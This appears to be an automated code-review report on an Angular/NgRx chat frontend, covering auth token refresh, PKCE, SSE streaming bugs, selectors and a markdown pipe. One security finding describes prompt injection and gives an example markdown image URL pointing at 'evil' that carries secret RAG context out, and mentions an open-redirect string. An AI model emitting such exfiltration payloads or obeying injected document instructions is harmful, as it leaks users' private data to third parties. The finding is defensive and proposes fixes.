# Segment: frontend-core-store

**Reviewed by:** frontend-ui-reviewer

## Files reviewed
- `frontend/src/app/core/auth/access.ts`
- `frontend/src/app/core/auth/auth.guard.ts`
- `frontend/src/app/core/auth/auth.interceptor.ts`
- `frontend/src/app/core/auth/auth.models.ts`
- `frontend/src/app/core/auth/auth.service.ts`
- `frontend/src/app/core/auth/http-auth.ts`
- `frontend/src/app/core/auth/oidc-client.ts`
- `frontend/src/app/core/auth/pkce.ts`
- `frontend/src/app/core/services/nexus-api.service.ts`
- `frontend/src/app/shared/chat/chat-stream.ts`
- `frontend/src/app/shared/documents/document-lifecycle.ts`
- `frontend/src/app/shared/documents/index-status.ts` (skimmed; pure helpers, see poll effects)
- `frontend/src/app/shared/groups/group-picker.component.ts`
- `frontend/src/app/shared/groups/group-selection.ts`
- `frontend/src/app/shared/models/nexus.models.ts` (partial: ChatStreamState and document types)
- `frontend/src/app/shared/pipes/markdown.pipe.ts`
- `frontend/src/app/store/auth.actions.ts`
- `frontend/src/app/store/auth.effects.ts`
- `frontend/src/app/store/auth.reducer.ts`
- `frontend/src/app/store/auth.selectors.ts`
- `frontend/src/app/store/nexus.actions.ts` (not read in full; action names inferred from effects/reducer)
- `frontend/src/app/store/nexus.effects.ts`
- `frontend/src/app/store/nexus.reducer.ts`
- `frontend/src/app/store/nexus.selectors.ts`
- `frontend/src/main.ts`

## Integrations
- angular
- ngrx

## Symbol inventory
| File | Symbol | Kind | Header |
|------|--------|------|--------|
| `core/auth/access.ts` | `decideAccess` | function | maps session + required roles to allow/login/forbidden/blocked |
| `core/auth/access.ts` | `menuFor` | function | role-to-menu visibility flags |
| `core/auth/access.ts` | `resolveNavigation` | function | decision to guard result via injected port |
| `core/auth/access.ts` | `parseGroups` | function | comma text to sorted unique group names |
| `core/auth/auth.guard.ts` | `roleGuard` | function | CanActivateFn factory; waits past "loading", take(1) |
| `core/auth/auth.interceptor.ts` | `authInterceptor` | function | adds Bearer to /api/ calls, 401 expire, 403 message |
| `core/auth/auth.service.ts` | `AuthService` | class | in-memory token holder, login/logout/refresh single-flight |
| `core/auth/oidc-client.ts` | `OidcClient` | class | auth-code + PKCE against Keycloak, state check |
| `core/auth/oidc-client.ts` | `safeReturnUrl` | function | open-redirect guard for return path |
| `core/auth/pkce.ts` | `randomString` / `codeChallenge` / `base64Url` | function | rejection-sampled verifier, S256 challenge |
| `core/auth/http-auth.ts` | `isApiRequest`, `endsSessionOnUnauthorized`, `bearer` | function | interceptor rules without Angular |
| `core/services/nexus-api.service.ts` | `NexusApiService` | class | single HttpClient facade for the whole API |
| `core/services/nexus-api.service.ts` | `streamChatMessage` | method | POST SSE via HttpClient progress events (line 215) |
| `shared/chat/chat-stream.ts` | `ServerSentEventsReader` | class | incremental SSE parser over partialText |
| `shared/chat/chat-stream.ts` | `describeChatError` | function | chat error text incl. usage-limit 429 |
| `shared/documents/document-lifecycle.ts` | `describeApiError`, `hasDocumentsInProgress`, `orderWithVersions` | function | doc status helpers and error text |
| `shared/groups/group-picker.component.ts` | `GroupPickerComponent` | component | chip picker or free-text fallback for groups |
| `shared/groups/group-selection.ts` | `toggleGroup`, `unknownGroups`, `selectedGroups` | function | comma-text group helpers |
| `shared/pipes/markdown.pipe.ts` | `MarkdownPipe` | pipe | marked + highlight.js + DomSanitizer |
| `store/auth.reducer.ts` | `authReducer` | reducer | status/user/error; tokens not in store |
| `store/auth.effects.ts` | `loadSessionEffect`, `sessionExpiredEffect`, `logoutEffect`, `loadAdminDataEffect` | effect | /me load, redirect to login, logout |
| `store/nexus.reducer.ts` | `nexusReducer` | reducer | one 800+ line reducer for all features |
| `store/nexus.effects.ts` | `sendChatQuestionEffect` | effect | create conversation, stream, map events to actions (line 237) |
| `store/nexus.effects.ts` | `pollDocumentStatusEffect`, `pollIndexStatusEffect` | effect | timer-based polling while work in progress (525, 580) |
| `store/nexus.selectors.ts` | 25 selectors | selector | mostly trivial slice selectors |
| `main.ts` | `bootstrapApplication` | bootstrap | HttpClient+interceptor, store, effects, app initializer (auth) |

## Conventions observed
- **Naming**: camelCase symbols, PascalCase types, kebab-case files; API payload fields snake_case; Portuguese comments, no accents in some strings (`nexus.effects.ts:209`) and accents in others.
- **Error handling**: every effect has inner `catchError` mapping to a `*Failure` action; one global `error: string` in nexus state.
- **Logging**: none in the segment except one `console.error` in `main.ts:32`.
- **Async style**: RxJS in store/API; Promises in `AuthService`; pure logic split into Angular-free files (`access.ts`, `http-auth.ts`, `chat-stream.ts`).
- **Type hints**: fully typed; no `any` observed. `payload as ChatResponse` casts at `chat-stream.ts:69`.

## Internal duplication
- 25+ effects in `nexus.effects.ts` repeat the same `ofType, switchMap, api, map success, catchError of(failure)` shape (lines 34-772). Candidate for a small helper.
- `documents` (flat) and `documentAccessByAssistant` hold the same entity; see State duplication.
- Trivial selectors repeat `createSelector(selectNexusState, s => s.x)` 20+ times.

## Cross-segment hints
- Verify `app.routes.ts` applies `roleGuard()` to every route (guard coverage cannot be judged from this segment). `roleGuard` returns `false` on status "error" (`access.ts:23`), so the app shell must render `selectSessionError`, otherwise the user sees a blank page.
- Components in other segments call `nexusActions.stopDocumentPolling`; if a component forgets to dispatch it on destroy, polling continues while the same assistant stays active.
- `/config.json` (`auth.service.ts:12`) and nginx/CSP: no CSP is visible here; the markdown image-exfiltration finding below depends on `img-src`/`connect-src` policy set in the web server segment.
- Backend SSE framing: `chat-stream.ts:18` only splits on `\n\n`. If the API uses sse-starlette (default `\r\n`), parsing yields nothing. Backend reviewer should confirm separator.
- Backend 429/error body contracts (`usage_limit`, `duplicate_document`) are duplicated as TS interfaces here (`chat-stream.ts:82`, `document-lifecycle.ts:82`).

## Specialist findings

### Component inventory
| Component | File:Line | Props | Fetches? | Owns state? | Notes |
|-----------|-----------|-------|----------|-------------|-------|
| `GroupPickerComponent` | group-picker.component.ts:224 | `@Input available, value, label, placeholder, emptyHint`; `@Output valueChange` | no | no (controlled) | default change detection; methods called from template (`selected()`, `unknown()`, `isSelected()` at 284-294); `*ngFor` without `trackBy` |
| `MarkdownPipe` (pure pipe) | markdown.pipe.ts:11 | `value: string \| null \| undefined` | no | no | re-parses full text on every streamed delta |

Only one component in this segment; the remaining files are services, guards, store.

### Security: markdown, tokens, PKCE

- **Markdown XSS (low, well handled).** `markdown.pipe.ts:39` runs `sanitizer.sanitize(SecurityContext.HTML, ...)` after marked and highlight. No `bypassSecurityTrust*` anywhere in the segment. Script, `on*`, `javascript:` stripped. highlight.js output is escaped and is sanitized afterwards too. Residual points:
  - **med** Remote images are not blocked. Angular's sanitizer keeps `<img src="https://attacker/…">`. A prompt-injected document can make the LLM emit `![x](https://evil/?q=<secret from context>)`, which leaks RAG content to a third party on render with zero clicks. Fix: custom marked renderer that drops or rewrites `image`, or enforce CSP `img-src 'self' data:`.
  - **low** Links: no `rel="noopener noreferrer"`/`target` policy set by the renderer (`marked.setOptions` at `markdown.pipe.ts:6`); the sanitizer does not add them. Phishing links from LLM output render as normal anchors.
  - **low** `decodeHtml` (`markdown.pipe.ts:42-48`) decodes `&amp;` first, so `&amp;lt;` becomes `<` instead of `&lt;` (double decode). Output goes through hljs, which escapes, so not exploitable, but displayed code is wrong. Decode `&amp;` last.
  - **low** `marked.setOptions` mutates the global singleton at module load (`markdown.pipe.ts:6`); any other importer of `marked` inherits `breaks: true`.
  - **low** Regex only matches `<pre><code class="language-x">`; fenced blocks with no language skip highlighting (acceptable) but unclosed fences during streaming flicker.
- **Token storage (OK).** Access, refresh and id tokens live only in `AuthService.tokens` memory (`auth.service.ts:24`); store holds no tokens (`auth.reducer.ts:8`). Only `{state, verifier, returnUrl}` goes to `sessionStorage` for the redirect round trip (`oidc-client.ts:61`), and is removed on read (`:123`). Reload costs a silent SSO round trip, acceptable.
- **PKCE/state (OK with gaps).** S256, 64-char rejection-sampled verifier, 32-char state, state compared on return (`oidc-client.ts:88`), pending entry consumed once, `safeReturnUrl` blocks `//` open redirect (`:171-173`).
  - **low** No `nonce` and the id_token is never validated. Id token is only used as `id_token_hint` for logout (`auth.service.ts:80`), so impact is limited, but any future use of its claims would be unverified. `scope` is `"openid"` only (`oidc-client.ts:65`); a refresh token is only issued if Keycloak is configured to do so for that client.
  - **low** `safeReturnUrl` accepts `/\evil.com` style input? `candidate.startsWith("/")` and not `//`: a value like `/\evil.com` passes and some browsers normalise `\` to `/`. Source is `window.location` of this origin and the value goes to `history.replaceState` (same-origin only), so not exploitable; tighten with a `URL` parse anyway.
  - **low** `completeLogin` failure leaves `?code=&state=` in the URL (`auth.service.ts:48-52` does not clean it). Reload re-enters `completeLogin`, finds no pending login and shows "não corresponde a um pedido" forever until the user edits the URL. Clean the URL in the catch.
  - **low** `redirect_uri` is `origin + "/"` (`auth.service.ts:147`); login from a deep link relies on `returnUrl` plus `replaceState` which is fine, but `window.history.replaceState` runs before Angular router initialises. Verify the router picks up the restored URL.

### Token refresh, 401 handling, guard
- **Single-flight refresh (OK).** `refreshing ??= renew().finally(...)` (`auth.service.ts:106`) deduplicates concurrent refreshes; `MIN_VALIDITY_MS` plus a proactive timer (`:131`).
- **med** Any refresh failure ends the session. `renew()` catches everything and calls `expire()` (`auth.service.ts:121-124`), so a transient network error or Keycloak 503 during refresh logs the user out and redirects, losing in-progress input. Only `invalid_grant` (HTTP 400) should expire; network errors should keep tokens and retry/backoff. `OidcError` messages do not carry status as a field, so the caller cannot distinguish (`oidc-client.ts:152-155`).
- **med** Proactive timer failure path is the same: `setTokens` timer calls `refresh()` (`:131`) and a failed background refresh forcibly redirects the user even if idle in a background tab.
- **low** Timer is `setTimeout`; throttled/suspended tabs fire late, but `validAccessToken` re-checks expiry before each request so correctness holds.
- **low** No retry after 401: a token revoked or rotated server-side forces full re-login (`auth.interceptor.ts:27-33`). Acceptable, but a single refresh-and-retry for non-/me calls would avoid needless logouts. Stream requests (`chat/stream`) get the same treatment.
- **low** `validAccessToken` returning `null` makes the interceptor send the request without Authorization (`auth.interceptor.ts:24`); it will 401 and trigger `expire()`. Fine, but redundant.
- **low** Concurrent 401s: protected by `leaving` flag set synchronously inside `login()`, so one redirect only. OK.
- **Guard coverage.** `roleGuard` (`auth.guard.ts:15`) correctly waits for `loading`, uses `take(1)`, forbidden goes home, anonymous triggers login. Gaps: guard never re-evaluates after navigation when the session later expires (only the interceptor handles that); `error` status returns `false` with no redirect or message from the guard. Role checks are client-side only, API enforces (documented RNF-23).
- **low** Guard returns a UrlTree to `/chat` for forbidden; if `/chat` itself requires a role, redirect loop. Confirm in routes.

### SSE streaming
- **high** Stream that ends without `done`/`error` leaves UI stuck. `streamChatMessage` (`nexus-api.service.ts:215-237`) completes silently on a dropped connection or a server that closes early; `chatStream` and `loading.sendChat` are only cleared by `sendChatQuestionSuccess/Failure` (`nexus.reducer.ts:445-455`). Result: permanent spinner and partial answer, input possibly disabled. Fix: in `sendChatQuestionEffect` track a terminal event (e.g. `materialize`/`last` or a `finalize` with flag) and emit `sendChatQuestionFailure` when the stream completes without one.
- **med** Final event without trailing blank line is dropped: `read()` requires `\n\n` (`chat-stream.ts:18-21`); at HttpEventType.Response the remainder is never flushed. Also CRLF framing (`\r\n\r\n`) is not recognised at all. Normalise `\r\n` to `\n` and flush the tail on Response.
- **med** No user-facing abort. Cancellation happens only through `switchMap` on the next `sendChatQuestion` (`nexus.effects.ts:241`). There is no `cancelChatStream` action, so leaving the chat screen does not stop generation (tokens keep being billed and the stream keeps writing into the store); also nothing clears `chatStream` on conversation/assistant switch except the selector hiding it (`nexus.selectors.ts:193`). Add a cancel action plus `takeUntil` on it.
- **low** Orphaned conversation: when the stream fails after `createConversation` succeeded, `createConversationSuccess` is deferred to `onDone` (`nexus.effects.ts:254-256`), so the server has a conversation the store never lists until reload.
- **low** `done` payload is cast without shape validation (`chat-stream.ts:69`); a malformed done event throws inside the reducer on `userMessage.content` (`nexus.reducer.ts:421`) and kills the store dispatch for that action (reducer exception).
- **low** Uses HttpClient progress events (`partialText`): works with the XHR backend used in `main.ts:20` (no `withFetch`); it re-reads the whole accumulated string every event (O(n) slice each time, fine at chat sizes). Moving to `withFetch()` later keeps partialText only for text bodies; note the coupling.
- **low** `chatStreamDelta` concatenates into store state per token (`nexus.reducer.ts:460`), dispatching one NgRx action per delta plus a full markdown re-parse (see Re-render hotspots). Batch with `bufferTime(50)`/`auditTime`.

### NgRx effects
- **Effects do not die on error (OK).** All HTTP calls sit inside inner pipes with `catchError`; the one exception is `exportFeedbackEffect` where `saveBlob` runs inside `map` (`nexus.effects.ts:345-348`); a DOM exception there would kill the effect (low). `URL.revokeObjectURL` immediately after `click()` (`:364`) can cancel the download in Safari/Firefox (low).
- **med** Polling dies silently on a failed refresh: `pollDocumentStatusEffect` (`:525-545`) re-arms only from `loadDocumentAccessSuccess`; one `loadDocumentAccessFailure` (blip, 401, 5xx) ends polling and documents stay "processando" until manual reload. Same for `pollIndexStatusEffect` (`:580-603`). Use `repeat`/`expand` or also re-arm on failure for background loads.
- **low** Polling stop conditions rely on external dispatch of `stopDocumentPolling` (shared by both pollers); documented as "closes screen" but enforced by components, not by the store.
- **low** `uploadDocumentEffect` uses unbounded `mergeMap` (`:187`); selecting many files fires all uploads in parallel (`createAssistantEffect` fans out `documentFiles.map` at `:59`). Use `mergeMap(..., 3)`.
- **low** `createAssistantEffect` uses `switchMap` (`:54`); a second create cancels the in-flight first one after the server may already have created it.
- **low** `reloadDocumentsAfterReindexEffect` `scan` accumulator is global across assistants and lives for the app lifetime (`:617-623`); correct for a single running job, wrong if two assistants reindex concurrently (jobId comparison still protects it).
- **low** `sessionExpiredEffect` calls `auth.login()` which silently returns if `client` is null (`auth.service.ts:58`), e.g. when `/config.json` failed; user is left `anonymous` with no UI feedback.
- **low** nexus state is never reset on `sessionExpired`/`logout` (reducer does not handle auth actions). Page navigates away on login redirect so memory is cleared, but between expiry and redirect the previous user's data stays selectable.
- Good: `loadSessionEffect` excludes `/me` from the 401 loop (`http-auth.ts:18`); `authEffects`/`nexusEffects` registered as functional effects.

### Selectors and state shape
- **med** Selectors recompute on every store change and some return fresh references. All nexus selectors take the whole `selectNexusState` as input, so each streamed delta (`chatStreamDelta`) re-runs every projector. Several return a new `[]` literal when empty: `selectCurrentMessages` (`nexus.selectors.ts:104`), `selectActiveAssistantConversations` (`:125`), `selectActiveDocumentAccess` (`:161`). `store.select` uses reference equality, so subscribers get a new emission per token during streaming. `selectCurrentCitationsByMessage` (`:110-121`) rebuilds with `Object.fromEntries` whenever its input array changes. Use module-level `const EMPTY = []`, and chain from narrower input selectors (`selectMessagesByConversation`, `selectCurrentConversationId`).
- **med** State duplication: `documents` (flat, `nexus.reducer.ts:30,99,233,386`) and `documentAccessByAssistant` (`:32,100,668`) store the same documents; `uploadDocumentSuccess` updates only the flat one, `loadDocumentAccessSuccess` only the map, so they diverge. Similarly `currentConversationId`, `selectedConversationByAssistant` and `activeAssistantId` encode the same selection three times and are kept in sync by hand in six reducers (`:183,230,243-251,270,304,318`).
- **med** Not normalised: `Assistant[]`, `Conversation[]` per assistant, `DocumentAccess[]` per assistant, replaced via `.map` (`:868-873`). `@ngrx/entity` would remove the hand-written upsert helpers.
- **low** One global `error` string (`nexus.reducer.ts:83`) shared by ~30 failure actions and cleared by any new request; concurrent failures overwrite each other. Plus 26-field `loading` record is flag-per-action boilerplate.
- **low** `nexus.reducer.ts` is one 800+ line file, `nexus.effects.ts` 800 lines: split by feature (chat, documents, admin).
- **low** Auth store is small and clean; `selectSessionSnapshot` memoised on `selectAuthState` OK (`auth.selectors.ts:53`).

### Hook / component hygiene (Angular equivalents)
- **low** No subscriptions are created in this segment's components; only the guard (`take(1)`) and effects subscribe. `AuthService` timer is cleaned in `clear()`; it is a root singleton so no destroy hook needed.
- **low** `GroupPickerComponent` (`group-picker.component.ts`): legacy `@Input`/`@Output`/`*ngIf`/`*ngFor` with `CommonModule`; calls `selected()`/`unknown()`/`isSelected()` from the template, each running `parseGroups` (split, trim, sort) per chip per change-detection pass: O(chips x groups) work; use `computed` signals or `OnPush` with `input()`. `*ngFor` lacks `trackBy`.
- **low** Template accessibility OK: chips are `<button type="button">` with `aria-pressed`, group has `role="group"` and `aria-label`; free-text input has `aria-label`. The "unknown" chips encode a remove action in `title` only; add an `aria-label`.
- **low** `NexusApiService` mixes `constructor(private readonly http)` with `inject()` used elsewhere (`auth.service.ts:21`): minor DI style drift.
- **low** API client in one 400-line `NexusApiService` plus `ServerSentEventsReader` imported from `shared/chat` into `core/services` (`nexus-api.service.ts:24`): layering inversion (core depends on shared).

## Concerns / smells
1. (high) SSE stream that ends without `done`/`error` leaves `chatStream` and `loading.sendChat` set forever; no cancel action either (`nexus.effects.ts:237-267`, `nexus-api.service.ts:215`).
2. (med) Remote images from LLM markdown survive sanitising, enabling zero-click data exfiltration via prompt injection (`markdown.pipe.ts:39`).
3. (med) Any refresh failure, including network errors, logs the user out (`auth.service.ts:112-125`).
4. (med) Document/index polling stops permanently after one failed poll (`nexus.effects.ts:525-603`).
5. (med) Selectors return fresh `[]`/objects and depend on the whole feature state; combined with per-token actions and full markdown re-parse each delta, streaming is O(n²) in re-render work (`nexus.selectors.ts:102-128,159-164`; `nexus.reducer.ts:460`).

## Refactor suggestions
1. `nexus.effects.ts:259` and `nexus-api.service.ts:215-237`: make the stream pipeline emit a failure when it completes without a terminal event, add `cancelChatStream` with `takeUntil`, normalise CRLF and flush the tail on Response. Why: removes the stuck-spinner and lost-last-event bugs.
2. `markdown.pipe.ts`: custom marked renderer that strips/rewrites `image` and adds `rel="noopener noreferrer" target="_blank"` to links; fix `decodeHtml` order; throttle input (or memoise by text) during streaming. Why: closes exfiltration channel and cuts re-render cost.
3. `auth.service.ts:112-125` + `oidc-client.ts:155`: give `OidcError` an HTTP `status`/`code`, expire only on `invalid_grant`, retry network failures with backoff; strip `code`/`state` from the URL when `completeLogin` throws. Why: avoids spurious logouts and the stuck error loop.
4. `nexus.reducer.ts` / `nexus.selectors.ts`: drop flat `documents`, adopt `@ngrx/entity` for assistants/conversations/documents, derive `currentConversationId` from `selectedConversationByAssistant`, use shared `EMPTY` constants and narrow input selectors. Why: removes state duplication and spurious emissions.
5. `nexus.effects.ts:525-603`: re-arm polling on failure of background loads (or use `expand`/`repeat`), cap `uploadDocument` concurrency, move `saveBlob` side effect into a `tap` guarded by try/catch. Why: polling and uploads survive transient errors.
